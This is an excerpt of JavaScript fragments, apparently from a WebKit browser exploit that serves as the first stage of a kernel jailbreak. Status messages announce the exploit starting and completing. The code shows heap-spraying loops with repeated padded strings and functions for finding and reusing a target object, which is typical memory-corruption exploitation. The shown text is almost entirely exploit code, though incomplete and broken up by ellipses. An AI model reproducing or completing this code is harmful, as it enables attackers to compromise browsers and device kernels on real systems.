...
document.getElementById("Mylog100").innerHTML = ("WebKit Exploit Complete.. Running the Kernel Exploit to Jailbreak !!");
...
let j=8 * 2 * 8 - 5 - LENGTH_STRINGIMPL;        
for(var i = 0; i < 100000; i++)
tmp_spray['Z'.repeat(j) + (''+i).padStart(5, '0')] = 0x1337;
...
function reuseTargetObj() {
	...
	let a = NB_FRAMES / 2 - 0x10;
	let b = NB_FRAMES / 2 + 0x10;
...
document.getElementById("Mylog10").innerHTML = ("Webkit Exploit Started");
}

function findTargetObj() {
  
  let a= g_arr_ab_1.length;
	for (let i = 0; i < a; i++) {
...
let f= (LENGTH_TIMER - LENGTH_STRINGIMPL - 5);	
let i = start;
	for (i; i < end; i++)
	{
		g_obj_str["A".repeat(f) + i.toString().padStart(5, "0")] = 0x1337;
